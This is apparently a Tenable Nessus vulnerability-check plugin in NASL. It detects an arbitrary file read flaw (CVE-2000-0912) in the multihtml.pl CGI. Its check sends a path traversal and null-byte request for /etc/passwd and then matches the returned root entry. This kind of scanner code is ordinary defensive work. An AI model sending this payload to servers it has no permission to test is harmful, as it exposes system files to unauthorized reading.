#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if(description)
{
 script_id(10516);
 script_version ("$Revision: 1.20 $");
 script_cve_id("CVE-2000-0912");
 script_bugtraq_id(6711);
 script_xref(name:"OSVDB", value:"415");

 script_name(english:"MultiHTML multihtml.pl Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server has a CGI application installed that is affected
by an information disclosure vulnerability." );
 script_set_attribute(attribute:"description", value:
"The 'multihtml.pl' CGI is installed. This CGI has a well known 
security flaw that lets an attacker read arbitrary files on the remote
host through the 'multi' parameter." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-09/0146.html" );
 script_set_attribute(attribute:"solution", value:
"There is no known solution at this time." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 
 script_summary(english:"Checks for the presence of /cgi-bin/multihtml.pl");
 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");
 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("http.inc");
include("misc_func.inc");
include("global_settings.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
  res = http_send_recv3(method:"GET", item:string(dir, "multihtml.pl?multi=/etc/passwd%00html"), port:port);
  if (isnull(res)) exit(1, "The remote web server did not respond.");
  
  if(egrep(pattern:".*root:.*:0:[01]:.*", string:res[2] )) security_warning(port);
}
